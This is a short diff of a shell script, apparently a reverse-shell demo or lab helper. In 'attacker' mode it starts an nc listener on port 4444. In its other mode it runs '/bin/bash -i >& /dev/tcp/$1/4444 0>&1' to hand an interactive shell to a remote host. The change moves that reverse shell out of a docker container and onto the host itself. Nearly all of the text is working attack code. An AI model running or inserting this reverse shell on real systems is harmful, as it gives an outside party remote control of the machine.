@@ -8,7 +8,10 @@ fi
 
 if [[ $1 = 'attacker' ]]; then
   echo "starting listener on port 4444"
+  set -x
   nc -lvp 4444
+else
+  echo "running reverse shell to $1"
+  set -x
+  /bin/bash -i >& "/dev/tcp/$1/4444" 0>&1
 fi
-
-docker run --network host -it ubuntu bash -c "/bin/bash -i >& /dev/tcp/$1/4444 0>&1"
